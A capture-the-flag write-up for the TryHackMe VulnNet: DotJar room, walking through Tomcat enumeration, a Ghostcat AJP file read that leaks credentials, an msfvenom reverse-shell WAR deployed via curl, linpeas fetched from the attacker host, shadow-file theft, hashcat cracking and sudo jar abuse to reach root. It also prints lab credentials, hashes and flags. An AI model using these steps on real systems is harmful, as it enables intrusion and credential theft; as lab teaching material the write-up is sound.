# VulnNet - DotJar

**Date:** 10, May, 2021

**Author:** Dhilip Sanjay S

---

[Click Here](https://tryhackme.com/room/vulnnetdotjar) to go to the TryHackMe room.

## Enumeration using nmap

```bash
$ nmap -sV <MACHINE_IP> | tee nmap.out

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 00:23 IST
Nmap scan report for <MACHINE_IP>
Host is up (0.22s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.85 seconds
```

## Gobuster

```bash
$ gobuster dir -u http://10.10.34.2:8080/ -t 100 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.34.2:8080/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/25 00:48:16 Starting gobuster in directory enumeration mode
===============================================================
/[                    (Status: 400) [Size: 762]
/]                    (Status: 400) [Size: 762]
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]             
/manager              (Status: 302) [Size: 0] [--> /manager/] 
/plain]               (Status: 400) [Size: 762]               
/quote]               (Status: 400) [Size: 762]               
                                                              
===============================================================
2021/04/25 00:48:53 Finished
===============================================================
```

## AJP Shooter 
- [Hunting and Exploiting the Apache Ghostcat](https://apkash8.medium.com/hunting-and-exploiting-apache-ghostcat-b7446ef83e74)
- [Ghostcat-CNVD-2020-10487](https://github.com/00theway/Ghostcat-CNVD-2020-10487)

```bash
python3 ajpShooter.py http://10.10.34.2:8080/ 8009 /WEB-INF/web.xml read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1977-1612105570000"
[<] Last-Modified: Sun, 31 Jan 2021 15:06:10 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1977

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>VulnNet Entertainment</display-name>
  <description>
     VulnNet Dev Regulations - mandatory
 
1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.
2. Every web application you develop and its source code stays here and is not subject to unauthorized self-publication.
-- Your work will be reviewed by our web experts and depending on the results and the company needs a process of implementation might start.
-- Your project scope is written in the contract.
3. Developer access is granted with the credentials provided below:
 
    webdev:Hgj3LA$02D$Fa@21
 
GUI access is disabled for security reasons.
 
4. All further instructions are delivered to your business mail address.
5. If you have any additional questions contact our staff help branch.
  </description>

</web-app>

```

## Reverse shell (Java)
- [Java Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java)

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.0.145 LPORT=1234 -f war > reverse.war

Payload size: 1102 bytes
Final size of war file: 1102 bytes
```

- Upload using command line (`manager-script` role is only enabled)

```bash
$ curl -u webdev -T reverse.war 'http://10.10.159.186:8080/manager/text/deploy?path=/'
Enter host password for user 'webdev':
OK - Deployed application at context path [/reverse.war]
```

### Shell access

- After uploading via command line, visit the URL in browser: `http://<MACHINE_IP>:8080/reverse.war`

- Simultaneously listen using netcat on the appropriate port. Once you get a shell, upgrade it.

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.9.0.145] from (UNKNOWN) [10.10.159.186] 53802
whoami
web
python3 -c 'import pty; pty.spawn("/bin/bash")'
web@vulnnet-dotjar:/$ ^Z
[1]+  Stopped                 nc -lvnp 1234

$ stty raw -echo; fg
nc -lvnp 1234

web@vulnnet-dotjar:/$ id
uid=1001(web) gid=1001(web) groups=1001(web)
```

## Linpeas

- Get linpeas on the target machine and execute it. I have added the output of linpeas which I found to be useful.

```bash
web@vulnnet-dotjar:~$ wget http://10.9.0.145:8000/linpeas.sh
--2021-05-10 21:49:28--  http://10.9.0.145:8000/linpeas.sh
Connecting to 10.9.0.145:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 339569 (332K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 331.61K   213KB/s    in 1.6s    

2021-05-10 21:49:30 (213 KB/s) - ‘linpeas.sh’ saved [339569/339569]

web@vulnnet-dotjar:~$ chmod +x linpeas.sh 
web@vulnnet-dotjar:~$ ./linpeas.sh | tee linpeas.output
.
.

[+] Password policy
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512
.
.
[+] Backup folders
drwxr-xr-x 2 root root 4096 May 11 07:45 /var/backups
total 2644
-rw-r--r-- 1 root root    102400 May 11 07:45 alternatives.tar.0
-rw-r--r-- 1 root root      2763 Jan 15 15:32 alternatives.tar.1.gz
-rw-r--r-- 1 root root     13208 Jan 31 16:10 apt.extended_states.0
-rw-r--r-- 1 root root      1419 Jan 31 16:01 apt.extended_states.1.gz
-rw-r--r-- 1 root root      1542 Jan 15 18:08 apt.extended_states.2.gz
-rw-r--r-- 1 root root        11 Jan 15 15:06 dpkg.arch.0
-rw-r--r-- 1 root root        43 Jan 15 15:06 dpkg.arch.1.gz
-rw-r--r-- 1 root root        43 Jan 15 15:06 dpkg.arch.2.gz
-rw-r--r-- 1 root root        43 Jan 15 15:06 dpkg.arch.3.gz
-rw-r--r-- 1 root root       280 Jan 15 15:26 dpkg.diversions.0
-rw-r--r-- 1 root root       160 Jan 15 15:26 dpkg.diversions.1.gz
-rw-r--r-- 1 root root       160 Jan 15 15:26 dpkg.diversions.2.gz
-rw-r--r-- 1 root root       160 Jan 15 15:26 dpkg.diversions.3.gz
-rw-r--r-- 1 root root       228 Jan 15 15:18 dpkg.statoverride.0
-rw-r--r-- 1 root root       179 Jan 15 15:18 dpkg.statoverride.1.gz
-rw-r--r-- 1 root root       179 Jan 15 15:18 dpkg.statoverride.2.gz
-rw-r--r-- 1 root root       179 Jan 15 15:18 dpkg.statoverride.3.gz
-rw-r--r-- 1 root root   1383027 Feb  2 17:27 dpkg.status.0
-rw-r--r-- 1 root root    373294 Jan 31 16:02 dpkg.status.1.gz
-rw-r--r-- 1 root root    375385 Jan 15 18:08 dpkg.status.2.gz
-rw-r--r-- 1 root root    366250 Jan 15 15:22 dpkg.status.3.gz
-rw------- 1 root root       857 Jan 15 18:11 group.bak
-rw------- 1 root shadow     711 Jan 15 18:11 gshadow.bak
-rw------- 1 root root      1745 Jan 15 15:52 passwd.bak
-rw-r--r-- 1 root root       485 Jan 16 13:44 shadow-backup-alt.gz
-rw------- 1 root shadow    1179 Jan 16 13:37 shadow.bak

.
.
```

## Privilege Escalation

### Accessing the shadow backup file
- Backup folder contains the shadow file backup. Try to download the `.bak` or `.gz` file to your machine to access it.

```bash
web@vulnnet-dotjar:/var/backups$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.9.1.20 - - [11/May/2021 08:12:05] code 404, message File not found
10.9.1.20 - - [11/May/2021 08:12:05] "GET /shadow.bak HTTP/1.1" 404 -
10.9.1.20 - - [11/May/2021 08:12:29] "GET /shadow-backup-alt.gz HTTP/1.1" 200 -
```

- Unzipping `.gz` file using `gunzip` to access the shadow file:

```bash
wget http://10.10.116.160:8000/shadow-backup-alt.gz
--2021-05-11 11:42:27--  http://10.10.116.160:8000/shadow-backup-alt.gz
Connecting to 10.10.116.160:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 485 [application/gzip]
Saving to: ‘shadow-backup-alt.gz’

shadow-backup-alt.gz              100%[=============================================================>]     485  --.-KB/s    in 0s      

2021-05-11 11:42:27 (1.14 MB/s) - ‘shadow-backup-alt.gz’ saved [485/485]

root@kali:~/Desktop/CTF/TryHackMe/vulnet:dotjar# gunzip shadow-backup-alt.gz 
root@kali:~/Desktop/CTF/TryHackMe/vulnet:dotjar# cat shadow-backup-alt 
root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:18643:0:99999:7:::
daemon:*:18642:0:99999:7:::
bin:*:18642:0:99999:7:::
sys:*:18642:0:99999:7:::
sync:*:18642:0:99999:7:::
games:*:18642:0:99999:7:::
man:*:18642:0:99999:7:::
lp:*:18642:0:99999:7:::
mail:*:18642:0:99999:7:::
news:*:18642:0:99999:7:::
uucp:*:18642:0:99999:7:::
proxy:*:18642:0:99999:7:::
www-data:*:18642:0:99999:7:::
backup:*:18642:0:99999:7:::
list:*:18642:0:99999:7:::
irc:*:18642:0:99999:7:::
gnats:*:18642:0:99999:7:::
nobody:*:18642:0:99999:7:::
systemd-network:*:18642:0:99999:7:::
systemd-resolve:*:18642:0:99999:7:::
syslog:*:18642:0:99999:7:::
messagebus:*:18642:0:99999:7:::
_apt:*:18642:0:99999:7:::
uuidd:*:18642:0:99999:7:::
lightdm:*:18642:0:99999:7:::
whoopsie:*:18642:0:99999:7:::
kernoops:*:18642:0:99999:7:::
pulse:*:18642:0:99999:7:::
avahi:*:18642:0:99999:7:::
hplip:*:18642:0:99999:7:::
jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:18643:0:99999:7:::
web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:18643:0:99999:7:::
```

### Cracking the Hash of jdk-admin

- We know that it's an **SHA-512** hash (via the password policy) - Check the linpeas output.
- So let's crack the hash using `john` or `hashcat`

```bash
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, 2886/2950 MB (1024 MB allocatable), 1MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:794613852
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQza...8A0z/1
Time.Started.....: Tue May 11 12:05:05 2021 (1 min, 8 secs)
Time.Estimated...: Tue May 11 12:06:13 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      385 H/s (10.48ms) @ Accel:20 Loops:1024 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 26160/14344385 (0.18%)
Rejected.........: 0/26160 (0.00%)
Restore.Point....: 26140/14344385 (0.18%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
Candidates.#1....: alyssa01 -> 794613852

Started: Tue May 11 12:05:03 2021
Stopped: Tue May 11 12:06:14 2021
```

## User.txt

- Switch user to `jdk-admin` using the cracked credentials and access the user flag

```bash
web@vulnnet-dotjar:/$ su jdk-admin
Password: 
jdk-admin@vulnnet-dotjar:/$ cd 
jdk-admin@vulnnet-dotjar:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt

jdk-admin@vulnnet-dotjar:~$ cat user.txt 
THM{1ae87fa6ec2cd9f840c68cbad78e9351}
```

## Root flag

- By listing the privileges of the `jdk-admin`, we find that this user can execute any jar file as root.

```bash
jdk-admin@vulnnet-dotjar:/$ sudo -ll
Password: 
Matching Defaults entries for jdk-admin on vulnnet-dotjar:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jdk-admin may run the following commands on vulnnet-dotjar:

Sudoers entry:
    RunAsUsers: root
    Commands:
	/usr/bin/java -jar *.jar
```

### Creating and Executing Jar file

- [Create and execute JAR file in linux - Reference](https://www.tecmint.com/create-and-execute-jar-file-in-linux/)

- Create `Exploit.java` file, which reads the **root.txt** from the root directory.

```java
import java.io.File;
import java.io.FileNotFoundException;
import java.util.Scanner;

public class Exploit {
  public static void main(String[] args) {
    try {
      File myObj = new File("/root/root.txt");
      Scanner myReader = new Scanner(myObj);
      while (myReader.hasNextLine()) {
        String data = myReader.nextLine();
        System.out.println(data);
      }
      myReader.close();
    } catch (FileNotFoundException e) {
      System.out.println("An error occurred.");
      e.printStackTrace();
    }
  }
}
```

- Executing Jar file, but it gives an error due to the absence of **manifest attribute**.

```bash
jdk-admin@vulnnet-dotjar:/dev/shm$ javac -d . Exploit.java     
jdk-admin@vulnnet-dotjar:/dev/shm$ ls
Exploit.class  Exploit.java
jdk-admin@vulnnet-dotjar:/dev/shm$ jar cvf exploit.jar Exploit.class 
added manifest
adding: Exploit.class(in = 865) (out= 563)(deflated 34%)
jdk-admin@vulnnet-dotjar:/dev/shm$ ls       
Exploit.class  exploit.jar  Exploit.java
jdk-admin@vulnnet-dotjar:/dev/shm$ sudo java -jar exploit.jar 
Password: 
no main manifest attribute, in exploit.jar
```

- Adding **manifest attribute** and then executing the exploit:

```bash
jdk-admin@vulnnet-dotjar:/dev/shm$ echo Main-Class: Exploit > MANIFEST.MF
jdk-admin@vulnnet-dotjar:/dev/shm$ jar cvmf MANIFEST.MF exploit.jar Exploit.class                      
added manifest
adding: Exploit.class(in = 865) (out= 563)(deflated 34%)

jdk-admin@vulnnet-dotjar:/dev/shm$ sudo java -jar exploit.jar 
THM{464c29e3ffae05c2e67e6f0c5064759c}
```


## References
- [Exploiting Apache Tomcat Port 8009 using Apache Jserv Protocol](https://www.ionize.com.au/post/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol)
- [Hunting and Exploiting the Apache Ghostcat](https://apkash8.medium.com/hunting-and-exploiting-apache-ghostcat-b7446ef83e74)
- [Ghostcat-CNVD-2020-10487](https://github.com/00theway/Ghostcat-CNVD-2020-10487)
- [Create and execute JAR file in linux](https://www.tecmint.com/create-and-execute-jar-file-in-linux/)